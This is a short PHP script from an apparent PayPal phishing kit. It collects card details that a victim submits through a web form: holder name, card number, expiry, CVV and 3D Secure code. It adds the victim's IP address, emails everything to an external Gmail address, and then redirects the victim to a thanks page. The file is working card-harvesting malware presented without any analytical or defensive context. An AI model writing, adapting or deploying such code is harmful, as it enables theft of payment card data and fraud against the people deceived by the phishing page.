<?php

$ip = getenv("REMOTE_ADDR");
$message .= "Name on Card : ".$_POST['xHolder']."\n";
$message .= "Credit Card Number : ".$_POST['xCCV']."\n";
$message .= "Month-Year : ".$_POST['xExpM']."/".$_POST['xExpY']."\n";
$message .= "Security Code : ".$_POST['xCVV']."\n";
$message .= "3D Security Code : ".$_POST['xVBV']."\n";
$message .= "User IP : ".$ip."\n";
$recipient = "sidresult28@gmail.com";
$subject = "PAYPAL | $ip";
$ip = getenv("REMOTE_ADDR");
mail($recipient,$subject,$message,$headers);?>





<script type="text/javascript">
</script><meta HTTP-EQUIV="REFRESH" content="0; url=thanks.html">